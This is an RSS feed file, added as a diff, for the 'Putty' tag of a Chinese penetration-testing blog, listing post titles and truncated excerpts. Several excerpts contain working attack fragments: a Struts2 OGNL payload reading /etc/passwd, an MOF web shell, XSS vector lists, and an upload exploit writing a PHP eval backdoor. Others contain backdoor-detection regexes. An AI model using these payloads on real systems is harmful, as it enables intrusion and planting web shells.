@@ -1,0 +1,462 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Putty on Nuclear&#39;Atk（核攻击）网络安全实验室</title>
+    <link>https://lcx.cc/tags/putty/</link>
+    <description>Recent content in Putty on Nuclear&#39;Atk（核攻击）网络安全实验室</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>zh-cn</language>
+    <copyright>Nuclear&#39;Atk（核攻击）网络安全实验室</copyright>
+    <lastBuildDate>Fri, 12 Dec 2014 18:08:29 +0800</lastBuildDate><atom:link href="https://lcx.cc/tags/putty/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Putty的噩梦 — 渗透工具PuttyRider使用心得分享</title>
+      <link>https://lcx.cc/post/4460/</link>
+      <pubDate>Fri, 12 Dec 2014 18:08:29 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/4460/</guid>
+      <description>Putty的噩梦——渗透工具PuttyRider使用心得分享 我们在入侵到一台主机的时候，经常会看到管理员的桌面会放着putty.exe，这说</description>
+    </item>
+    
+    <item>
+      <title>一些有趣的 XSS Vector</title>
+      <link>https://lcx.cc/post/4427/</link>
+      <pubDate>Thu, 11 Sep 2014 09:53:11 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/4427/</guid>
+      <description>XSS Vector #1 &amp;lt;script src=https://lcx.cc/?20.rs&amp;gt;&amp;lt;/script&amp;gt; URL中第二个斜杠在Internet Explorer下（测试于IE11）可被U+3031,U+3033,U+3035,U+309D</description>
+    </item>
+    
+    <item>
+      <title>轻松绕各种WAF的POST注入、跨站防御(比如安全狗)</title>
+      <link>https://lcx.cc/post/4263/</link>
+      <pubDate>Mon, 31 Mar 2014 10:41:10 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/4263/</guid>
+      <description>XXX之前有提过multipart请求绕过各种WAF方式：360网站宝/安全宝/加速乐及其他类似产品防护绕过缺陷之一，貌似没引起多少人关注。</description>
+    </item>
+    
+    <item>
+      <title>Bypass xss过滤的测试方法</title>
+      <link>https://lcx.cc/post/4172/</link>
+      <pubDate>Wed, 15 Jan 2014 10:45:38 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/4172/</guid>
+      <description>0x00 背景 本文来自于《Modern Web Application Firewalls Fingerprinting and Bypassing XSS Filters》其中的bypass xss过滤的部分，前面有根据WAF特征确定是哪个WAF的测试方</description>
+    </item>
+    
+    <item>
+      <title>WAF指纹探测及识别技术</title>
+      <link>https://lcx.cc/post/4160/</link>
+      <pubDate>Thu, 09 Jan 2014 14:50:35 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/4160/</guid>
+      <description>Web应用防护系统（也称：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用国际上公认的一种说法：Web应用防火墙</description>
+    </item>
+    
+    <item>
+      <title>跨协议通信技术利用，什么是跨协议通信？</title>
+      <link>https://lcx.cc/post/4145/</link>
+      <pubDate>Fri, 03 Jan 2014 09:45:05 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/4145/</guid>
+      <description># 什么是跨协议通信 # 跨协议通信技术(Inter-Protocol Communication)是指两种不同的协议可以交换指令和数据的技术。其中</description>
+    </item>
+    
+    <item>
+      <title>mof提权带回显带清楚命令版本.php</title>
+      <link>https://lcx.cc/post/4048/</link>
+      <pubDate>Tue, 26 Nov 2013 09:58:00 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/4048/</guid>
+      <description>&amp;lt;?php $path=&#34;c:/windows/system32/canimei&#34;; session_start(); if(!empty($_POST[&#39;submit&#39;])){ setcookie(&#34;connect&#34;); setcookie(&#34;connect[host]&#34;,$_POST[&#39;host&#39;]); setcookie(&#34;connect[user]&#34;,$_POST[&#39;user&#39;]); setcookie(&#34;connect[pass]&#34;,$_POST[&#39;pass&#39;]); setcookie(&#34;connect[dbname]&#34;,$_POST[&#39;dbname&#39;]); echo &#34;&amp;lt;script&amp;gt;location.href=&#39;?action=connect&#39;&amp;lt;/script&amp;gt;&#34;; } if(empty($_GET[&#34;action&#34;])){ ?&amp;gt; &amp;lt;html&amp;gt; &amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Win MOF Shell&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;form action=&#34;?action=connect&#34; method=&#34;post&#34;&amp;gt; Host: &amp;lt;input type=&#34;text&#34; name=&#34;host&#34; value=&#34;192.168.200.144:3306&#34;&amp;gt;&amp;lt;br/&amp;gt; User: &amp;lt;input type=&#34;text&#34; name=&#34;user&#34; value=&#34;root&#34;&amp;gt;&amp;lt;br/&amp;gt; Pass: &amp;lt;input type=&#34;password&#34; name=&#34;pass&#34; value=&#34;toor&#34;&amp;gt;&amp;lt;br/&amp;gt; DB: &amp;lt;input type=&#34;text&#34; name=&#34;dbname&#34; value=&#34;mysql&#34;&amp;gt;&amp;lt;br/&amp;gt; &amp;lt;input type=&#34;submit&#34; name=&#34;submit&#34; value=&#34;Submit&#34;&amp;gt;&amp;lt;br/&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt; &amp;lt;?php exit; } if ($_GET[action]==&#39;connect&#39;) { $conn=mysql_connect($_COOKIE[&#34;connect&#34;][&#34;host&#34;],$_COOKIE[&#34;connect&#34;][&#34;user&#34;],$_COOKIE[&#34;connect&#34;][&#34;pass&#34;]) or die(&#39;&amp;lt;pre&amp;gt;&#39;.mysql_error().&#39;&amp;lt;/pre&amp;gt;&#39;); echo &#34;&amp;lt;form action=&#39;&#39; method=&#39;post&#39;&amp;gt;&#34;; echo &#34;Cmd:&#34;; echo &#34;&amp;lt;input type=&#39;text&#39; name=&#39;cmd&#39; value=&#39;$strCmd&#39;?&amp;gt;&#34;; echo</description>
+    </item>
+    
+    <item>
+      <title>跨过边界防火墙，我拿菜刀砍内网</title>
+      <link>https://lcx.cc/post/4016/</link>
+      <pubDate>Tue, 19 Nov 2013 14:48:35 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/4016/</guid>
+      <description>内网环境一般比较复杂，有时候针对内网的渗透会使用各种各样的方法、手段； 我所遇到的内网环境有以下几种(其它的大牛们来补充哈)： 情况一：内、外网</description>
+    </item>
+    
+    <item>
+      <title>网站密码被星号加密了？教你怎么解。</title>
+      <link>https://lcx.cc/post/3978/</link>
+      <pubDate>Mon, 04 Nov 2013 09:59:22 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3978/</guid>
+      <description>网站密码被星号加密了？教你怎么解。 Black-Hole | 2013-11-02 16:35 这也是只是我在学javascript时，突然想到的，今天试验了下，果然成功了。 这是个测试的：这个事</description>
+    </item>
+    
+    <item>
+      <title>完美扫描PHP特殊一句话后门</title>
+      <link>https://lcx.cc/post/3976/</link>
+      <pubDate>Fri, 01 Nov 2013 08:40:11 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3976/</guid>
+      <description>&amp;lt;?php /********************** 作者 Spider 网上公布的各种PHP后门全军覆没 针对一些特殊变形的后门需要自己添加特征 误报率不到百分之一 **********************/ error_reporting(E_ERROR); ini_set(&#39;max_execution_time&#39;,20000); ini_set(&#39;memory_limit&#39;,&#39;512M&#39;); header(&#34;content-Type: text/html; charset=gb2312&#34;); $matches = array( &#39;/function\_exists\s*\(\s*[\&#39;|\&#34;](popen|exec|proc\_open|system|passthru)+[\&#39;|\&#34;]\s*\)/i&#39;, &#39;/(exec|shell\_exec|system|passthru)+\s*\(\s*\$\_(\w+)\[(.*)\]\s*\)/i&#39;, &#39;/((udp|tcp)\:\/\/(.*)\;)+/i&#39;, &#39;/preg\_replace\s*\((.*)\/e(.*)\,\s*\$\_(.*)\,(.*)\)/i&#39;, &#39;/preg\_replace\s*\((.*)\(base64\_decode\(\$/i&#39;, &#39;/(eval|assert|include|require|include\_once|require\_once)+\s*\(\s*(base64\_decode|str\_rot13|gz(\w+)|file\_(\w+)\_contents|(.*)php\:\/\/input)+/i&#39;, &#39;/(eval|assert|include|require|include\_once|require\_once|array\_map|array\_walk)+\s*\(\s*\$\_(GET|POST|REQUEST|COOKIE|SERVER|SESSION)+\[(.*)\]\s*\)/i&#39;, &#39;/eval\s*\(\s*\(\s*\$\$(\w+)/i&#39;, &#39;/(include|require|include\_once|require\_once)+\s*\(\s*[\&#39;|\&#34;](\w+)\.(jpg|gif|ico|bmp|png|txt|zip|rar|htm|css|js)+[\&#39;|\&#34;]\s*\)/i&#39;, &#39;/\$\_(\w+)(.*)(eval|assert|include|require|include\_once|require\_once)+\s*\(\s*\$(\w+)\s*\)/i&#39;, &#39;/\(\s*\$\_FILES\[(.*)\]\[(.*)\]\s*\,\s*\$\_(GET|POST|REQUEST|FILES)+\[(.*)\]\[(.*)\]\s*\)/i&#39;,</description>
+    </item>
+    
+    <item>
+      <title>Short XSS</title>
+      <link>https://lcx.cc/post/3886/</link>
+      <pubDate>Tue, 17 Sep 2013 17:09:35 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3886/</guid>
+      <description>0x00 背景 关键时候长度不够怎么办？ 在实际的情况中如果你不够长怎么办呢？看医生？吃药？做手术？。。。。。。。。。。。。。。算了，既然自身硬件不足，</description>
+    </item>
+    
+    <item>
+      <title>Struts2 S2-016/S2-017 命令执行带回显、看web路径、getshell exp整理</title>
+      <link>https://lcx.cc/post/3733/</link>
+      <pubDate>Thu, 18 Jul 2013 10:01:42 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3733/</guid>
+      <description>大家都发了，，我就整理了一下。友情提示，自己小命比shell重要哦。。 喜欢就点一下感谢吧^_^ 带回显命令执行： http://www.example.com/struts2-blank/example/X.action?redirect:${%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]{&#39;cat&#39;,&#39;/etc/passwd&#39;})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23matt%3d%23context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} 爆路径： http://www.example.com/struts2-blank/example/X.action?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D 写文件：</description>
+    </item>
+    
+    <item>
+      <title>美国VPS管理系统SolusVM 1.13.03 SQL注入漏洞（含exp）</title>
+      <link>https://lcx.cc/post/3679/</link>
+      <pubDate>Mon, 08 Jul 2013 16:22:48 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3679/</guid>
+      <description>SolusVM软件是一个拥有强大的图形用户界面的VPS管理系统，可以同时管理三种虚拟化技术：OpenVZ ,Xen Paravirtualizatio</description>
+    </item>
+    
+    <item>
+      <title>邮箱跨站代码收集</title>
+      <link>https://lcx.cc/post/3167/</link>
+      <pubDate>Mon, 17 Dec 2012 20:00:13 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3167/</guid>
+      <description>&amp;lt;script&amp;gt;alert(&#34;dddd&#34;)&amp;lt;script&amp;gt; &amp;lt;script&amp;gt;alert(&#39;test&#39;)&amp;lt;/script&amp;gt; ----------------------------TOM------------------------------------------------------------------- &amp;lt;img src=&#34;http://www.google.cn/intl/zh-CN/images/logo_cn.gif&#34; width=0 height=0 ononloadload=&#34;alert(52)&#34;&amp;gt;52 &amp;lt;img src=&#34;http://www.google.cn/intl/zh-CN/images/logo_cn.gif&#34; width=0 height=0 onload=&#34;alert(53)&#34;&amp;gt;53 &amp;lt;img src=&#34;http://www.google.cn/intl/zh-CN/images/logo_cn.gif&#34; width=0 height=0 /**/onload=&#34;alert(54)&#34;&amp;gt;54 &amp;lt;ba=&#34;&amp;lt;script&amp;gt;alert(55);&amp;lt;/script&amp;gt;&#34;55 &amp;lt;img/*****/src=# width=0 height=0 /***/onerror=alert(56)&amp;gt;56 &amp;lt;iframe/**/src=http://www.baidu.com&amp;gt;57&amp;lt;/iframe&amp;gt; &amp;lt;img src=http://www.google.cn/intl/zh-CN/images/logo_cn.gif onreadystatechange=alert(58)&amp;gt;58 &amp;lt;image src=http://www.google.cn/intl/zh-CN/images/logo_cn.gif onreadystatechange=alert(59)&amp;gt;59 &amp;lt;style onreadystatechange=alert(60)&amp;gt;60&amp;lt;/style&amp;gt; &amp;lt;xml onreadystatechange=alert(61)&amp;gt;xxxx&amp;lt;/xml&amp;gt;61 &amp;lt;object type=image src=http://www.google.cn/intl/zh-CN/images/logo_cn.gif onreadystatechange=alert(62)&amp;gt;62 &amp;lt;img type=image src=http://www.google.cn/intl/zh-CN/images/logo_cn.gif onreadystatechange=alert(63)&amp;gt;63 &amp;lt;P STYLE=&#34;behavior:url(&#39;#default#time2&#39;)&#34; onEnd=alert(64)&amp;gt;64 &amp;lt;P STYLE=&#34;behavior:url(&#39;#default#time2&#39;)&#34; onBegin=alert(65)&amp;gt;65 &amp;lt;style&amp;gt;&amp;lt;img src=&#34;&amp;lt;/style&amp;gt;&amp;lt;img src=x onerror=alert(66)//&#34;&amp;gt;66 ---------------------------------------------------------------------------------------------- &amp;lt;DIV STYLE=&#34;background-image:\0075\0072\006C\0028\006A\0061\0076\0061\0073\0063\0072\0069\0070\0074\003A\0061\006C\0065\0072\0074\0028\002F\0078\0073\0073\002F\0029\0029&#34;&amp;gt; &amp;lt;frameset onload=alert(1)&amp;gt; &amp;lt;IMG SRC=&#34;jav ascript:alert(&#39;XSS-1&#39;);&#34;&amp;gt; &amp;lt;IMG &#34;&#34;&#34;&amp;gt;&amp;lt;SCRIPT&amp;gt;alert(&#34;XSS-2&#34;)&amp;lt;/SCRIPT&amp;gt;&#34;&amp;gt; Hello,80sec &amp;lt;/xss style=&#34;x:expression(alert(document.cookie))&#34;&amp;gt; &amp;lt;IMG SRC = &#34; j</description>
+    </item>
+    
+    <item>
+      <title>程序员疫苗：代码注入</title>
+      <link>https://lcx.cc/post/3144/</link>
+      <pubDate>Tue, 11 Dec 2012 14:19:50 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3144/</guid>
+      <description>几个月在我的微博上说过要建一个程序员疫苗网站，希望大家一起来提交一些错误示例的代码，来帮助我们新入行的程序员，不要让我们的程序员一代又一代的</description>
+    </item>
+    
+    <item>
+      <title>Modoer Exp</title>
+      <link>https://lcx.cc/post/2941/</link>
+      <pubDate>Wed, 26 Sep 2012 09:31:52 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/2941/</guid>
+      <description>在线版： function expstart() { var url = document.forms[0].url.value; if(url != &#34;&#34;){ if(url.search(&#34;http://&#34;) Modoer EXP url: 源码： &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;title&amp;gt; Modoer EXP &amp;lt;/title&amp;gt; &amp;lt;meta http-equiv=&#34;Content-Type&#34; content=&#34;text/html; charset=utf-8&#34; /&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;script language=&#34;javascript&#34;&amp;gt; function expstart() { var url = document.forms[0].url.value; if(url != &#34;&#34;){ if(url.search(&#34;http://&#34;) &amp;lt; 0 &amp;amp;&amp;amp; url.search(&#34;https://&#34;) &amp;lt; 0){ url = &#34;http://&#34; + url; } document.submit_url.action = url + &#34;/item.php?act=ajax&amp;amp;op=get_membereffect&amp;amp;do=subject&#34;; }else{ alert(&#34;Hello Hacker!!!&#34;); } } &amp;lt;/script&amp;gt; &amp;lt;body&amp;gt;</description>
+    </item>
+    
+    <item>
+      <title>关于 MSF 枚举 putty 我想说两句</title>
+      <link>https://lcx.cc/post/2906/</link>
+      <pubDate>Fri, 21 Sep 2012 08:38:07 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/2906/</guid>
+      <description>关于MSF枚举putty我来吐槽几句吧 介个不是神马劫持putty神马的 没那么复杂 msf当中的后渗透模块确实有很多奇淫技巧在里面 但是没有什么想</description>
+    </item>
+    
+    <item>
+      <title>javascript: onsubmit = return false 阻止 form 表单提交</title>
+      <link>https://lcx.cc/post/2777/</link>
+      <pubDate>Mon, 13 Aug 2012 10:46:38 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/2777/</guid>
+      <description>return false 阻止表单提交不起作用，今天这个问题困扰了我很久，在网上找了很多资料，基本上关于 onsubmit = return&amp;nbsp;false 有以下几点要注意的地方： 1. return&amp;nbsp;的</description>
+    </item>
+    
+    <item>
+      <title>劫持表单、在不影响原程序逻辑的前提下、同时将数据发送到多个地址</title>
+      <link>https://lcx.cc/post/2775/</link>
+      <pubDate>Mon, 13 Aug 2012 09:41:28 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/2775/</guid>
+      <description>一个利用 JavaScript 劫持表单的话题，在不影响原程序运行逻辑的同时，将表单数据发送到多个地址，并且把数据提交到原地址。 在乌云看到一个技术挑战贴：来吧，技</description>
+    </item>
+    
+    <item>
+      <title>ZYCHCMS企业网站管理系统SQL注入漏洞及后台拿webshell</title>
+      <link>https://lcx.cc/post/2751/</link>
+      <pubDate>Mon, 06 Aug 2012 11:06:13 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/2751/</guid>
+      <description>影响版本：ZYCHCMS企业网站管理系统4.2（存在以下两个文件的版本应该是通杀） ①SQL注射漏洞 漏洞文件：/admin/add_js.as</description>
+    </item>
+    
+    <item>
+      <title>PHP程序的常见漏洞攻击分析</title>
+      <link>https://lcx.cc/post/2750/</link>
+      <pubDate>Mon, 06 Aug 2012 10:38:56 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/2750/</guid>
+      <description>不是固若金汤，随着PHP的广泛运用，一些黑客们也在无时不想找PHP的麻烦，通过PHP程序漏洞进行攻击就是其中一种。在节，我们将从全局变量，远</description>
+    </item>
+    
+    <item>
+      <title>SemCms （外贸企业网站管理系统）多处漏洞 &amp; SemCms Exp</title>
+      <link>https://lcx.cc/post/2684/</link>
+      <pubDate>Sun, 15 Jul 2012 17:05:32 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/2684/</guid>
+      <description>后台验证： 验证文件：Clkj_Inc\WebOut.asp &amp;lt;% if session(&#34;username&#34;)&amp;lt;&amp;gt;&#34;&#34; then Set Rs=server.createobject(&#34;adodb.recordset&#34;) Sql=&#34;select * from clkj_admin where clkj_password=&#39;&#34;&amp;amp;request.cookies(&#34;userpas&#34;)(&#34;upas&#34;)&amp;amp;&#34;&#39;&#34; Rs.open sql,conn,1,1 if not (rs.eof and rs.bof) then session(&#34;username&#34;)=request.cookies(&#34;username&#34;)(&#34;uname&#34;) end if else Response.Write &#34;&amp;lt;script language=&#39;javas</description>
+    </item>
+    
+    <item>
+      <title>SHOPEX 4.8.5 注入漏洞以及后台拿SHELL</title>
+      <link>https://lcx.cc/post/2610/</link>
+      <pubDate>Mon, 25 Jun 2012 12:59:29 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/2610/</guid>
+      <description>漏洞文件： 漏洞核心函数 \core\model_v5\trading\mdl.goods.php function gnotify($goods_id=0,$product_id=0){ if($_POST[&#39;goods&#39;][&#39;goods_id&#39;]){ $goods_id = $_POST[&#39;goods&#39;][&#39;goods_id&#39;]; $product_id = $_POST[&#39;goods&#39;][&#39;product_id&#39;]; } $this-&amp;gt;id =$goods_id; $objGoods = &amp;amp;$this-&amp;gt;system-&amp;gt;loadModel(&#39;trading/goods&#39;); $aProduct = $objGoods-&amp;gt;getProducts($goods_id, $product_id);//www.lpboke.com 直接带进去了 $this-&amp;gt;pagedata[&#39;goods&#39;] = $aProduct[0]; if($this-&amp;gt;member[member_id]){ $objMember = &amp;amp;$this-&amp;gt;system-&amp;gt;loadModel(&#39;member/member&#39;); $aMemInfo = $objMember-&amp;gt;getFieldById($this-&amp;gt;member[member_id], array(&#39;email&#39;)); $this-&amp;gt;pagedata[&#39;member&#39;] = $aMemInfo; } $this-&amp;gt;output(); } \core\shop\controller\ctl.product.php 文件调用 漏洞代码 public function getProducts( $gid, $pid = 0</description>
+    </item>
+    
+    <item>
+      <title>Opencart 多漏洞解析</title>
+      <link>https://lcx.cc/post/2438/</link>
+      <pubDate>Fri, 27 Apr 2012 09:00:42 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/2438/</guid>
+      <description>Opencart本地包含漏洞分析 作者：单恋一支花 from dis9 team 漏洞编号：http://www.exploit-db.com/exploits/171</description>
+    </item>
+    
+    <item>
+      <title>关于putty汉化版后门事件受影响的IP</title>
+      <link>https://lcx.cc/post/2186/</link>
+      <pubDate>Wed, 01 Feb 2012 23:20:13 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/2186/</guid>
+      <description>用过这款软件的筒子们自查吧。感谢团长和叽咕海(hysia)提供的线索。 10.0.0.102 10.0.0.110 10.0.0.119 10.0.0.13 10.0.0.136 10.0.0.163 10.0.0.226 10.0.0.32 10.0.0.42 10.0.0.7 10.0.1.2 10.0.1.3 10.0.1.7 10.0.102.94 10.0.134.231 10.0.19.84 10.0.2.32 10.0.33.129 10.0.5.220 10.1.0.21 10.1.1.1 10.1.1.11 10.1.1.24 10.1.1.88 10.1.146.156 10.1.165.29 10.1.165.31 10.1.2.197 10.1.2.198 10.1.55.112 10.1.55.115 10.1.55.45 10.1.63.101 10.1.83.68 10.10.0.31</description>
+    </item>
+    
+    <item>
+      <title>汉化版 putty、WinSCP、SSH Secure 等工具中发现后门</title>
+      <link>https://lcx.cc/post/2185/</link>
+      <pubDate>Wed, 01 Feb 2012 22:58:24 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/2185/</guid>
+      <description>多个安全达人在微博发布消息，称在汉化版putty、WinSCP、SSH Secure等工具中发现后门。经金山毒霸安全中心验证，这些汉化版管理工</description>
+    </item>
+    
+    <item>
+      <title>360全面拦截PuTTY等汉化版黑客后门</title>
+      <link>https://lcx.cc/post/2182/</link>
+      <pubDate>Wed, 01 Feb 2012 18:48:08 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/2182/</guid>
+      <description>1月31日消息，360安全中心今日发布安全警报称，国内流行的部分“汉化版”PuTTY、WinSCP、SSHSecure工具内置黑客后门，可能</description>
+    </item>
+    
+    <item>
+      <title>中文版putty后门事件分析</title>
+      <link>https://lcx.cc/post/2187/</link>
+      <pubDate>Wed, 01 Feb 2012 17:38:00 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/2187/</guid>
+      <description>近几日，中文版putty等SSH远程管理工具被曝出存在后门，该后门会自动窃取管理员所输入的SSH用户名与口令，并将其发送至指定服务器上。知道</description>
+    </item>
+    
+    <item>
+      <title>phpweb解析不当加上传漏洞</title>
+      <link>https://lcx.cc/post/1924/</link>
+      <pubDate>Sun, 20 Nov 2011 00:10:00 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/1924/</guid>
+      <description>&amp;nbsp;&amp;nbsp;&amp;nbsp; 漏洞详情简要描述：新版的phpweb 存在这上传和解析不当漏洞 &amp;nbsp;&amp;nbsp;&amp;nbsp; 详细说明： &amp;lt;input type=&#34;hidden&#34; name=&#34;filepath&#34; value=&#34;Account/adminindex/1.asp;&#34;&amp;gt; &amp;lt;input type=&#34;hidden&#34; name=&#34;filelx&#34; value=&#34;jpg&#34;&amp;gt; &amp;nbsp;&amp;nbsp;&amp;nbsp; 漏洞证明：exp 上传shell.php.jpg &amp;lt;form</description>
+    </item>
+    
+    <item>
+      <title>GoCDKEY 游戏推广系统上传漏洞 - 脚本漏洞</title>
+      <link>https://lcx.cc/post/1921/</link>
+      <pubDate>Sat, 19 Nov 2011 23:51:00 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/1921/</guid>
+      <description>&amp;nbsp;&amp;nbsp;&amp;nbsp; By：piaoye &amp;nbsp;&amp;nbsp;&amp;nbsp; 因需要下了源码看了下 &amp;nbsp;&amp;nbsp;&amp;nbsp; 出现在 \inc\img_save.asp 文件 以下是引用片段： ....省略一千万行.... set fs=server.CreateObject(&#34;scripting.filesystemobject&#34;) set upload=new upload_5xSoft &#39;&#39;建立上传对象 &#39;------</description>
+    </item>
+    
+    <item>
+      <title>PHP Web 木马扫描器 - 安全测试工具</title>
+      <link>https://lcx.cc/post/1916/</link>
+      <pubDate>Fri, 18 Nov 2011 14:14:00 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/1916/</guid>
+      <description>scanner.php： &amp;lt;?php /**************PHP Web木马扫描器************************/ /* [+] 作者: alibaba&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; */ /* [+] QQ: 1499281192&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; */ /* [+] MSN: weeming21@hotmail.com&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; */ /* [+] 首发: t00ls.net</description>
+    </item>
+    
+    <item>
+      <title>嘉缘人才系统漏洞</title>
+      <link>https://lcx.cc/post/1914/</link>
+      <pubDate>Fri, 18 Nov 2011 13:52:00 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/1914/</guid>
+      <description>By：毅心毅意 为什么会出现漏洞...看这里 http://www.exploit-db.com/exploits/18075/ exp： jiayun.html： &amp;lt;form action=&#34;&#34; method=&#34;post&#34; name=&#34;QuickSearch&#34; id=&#34;QuickSearch&#34; onsubmit=&#34;addaction();&#34;&amp;gt;&amp;lt;input type=&#34;text&#34; value=&#34;http://127.0.0.1/freditor/plugins/ajaxfilemanager/ajax_create_folder.php&#34; name=&#34;doaction&#34; style=&#34;width:400&#34;&amp;gt;&amp;lt;br /&amp;gt;&amp;lt;input type=&#34;text&#34; value=&#34;&amp;lt;?php eval($_POST[t00ls])?&amp;gt;&#34; name=&#34;foo&#34; style=&#34;width:400&#34;&amp;gt;&amp;lt;br /&amp;gt;&amp;lt;input type=&#34;submit&#34; value=&#34;提交&#34; name=&#34;QuickSearchBtn&#34;&amp;gt;&amp;lt;br /&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;script&amp;gt;function addaction(){ document.QuickSearch.action=document.QuickSearch.doaction.value;}&amp;lt;/script&amp;gt;</description>
+    </item>
+    
+    <item>
+      <title>Basic PHP CMS、BasicCMS xss csrf - 脚本漏洞(Scripts Bugs)</title>
+      <link>https://lcx.cc/post/1735/</link>
+      <pubDate>Tue, 30 Aug 2011 19:56:00 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/1735/</guid>
+      <description>basiccms 版本不太清楚了 菲哥哥 存在跨站： http://localhost/basiccms/index.php?id=&amp;lt;iframe width=&#39;100&#39; height=&#39;100&#39; src=&#39; http://localhost/basiccms/ CSRF.html &#39;&amp;gt; http://localhost/basiccms/Admin/Users/AddModify</description>
+    </item>
+    
+    <item>
+      <title>DedeCms v5.6-5.7 爆严重安全漏洞 …… - 拿 WebShell EXP</title>
+      <link>https://lcx.cc/post/1682/</link>
+      <pubDate>Thu, 11 Aug 2011 14:25:00 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/1682/</guid>
+      <description>详细分析下dedecms的这个劫持数据库洞子 &amp;nbsp;&amp;nbsp;&amp;nbsp; 漏洞不是我发的，这里仅仅只是分析这个漏洞的成因&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp; 今天看到微博看到dedecms出</description>
+    </item>
+    
+    <item>
+      <title>eWebeditoR3.8 for php任意文件上传EXP - 脚本漏洞</title>
+      <link>https://lcx.cc/post/1642/</link>
+      <pubDate>Tue, 02 Aug 2011 17:01:00 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/1642/</guid>
+      <description>&amp;nbsp;&amp;nbsp;&amp;nbsp; By：振兴家电 &amp;nbsp;&amp;nbsp;&amp;nbsp; 一次搞一个站的时候 找了半天才找到的一个EXP&amp;amp;nbsp;&amp;amp;nbsp;靠这个EXP搞定了那个站！给黑友们分享</description>
+    </item>
+    
+    <item>
+      <title>PHPaaCMS 4.0 oday - 技术文章</title>
+      <link>https://lcx.cc/post/1615/</link>
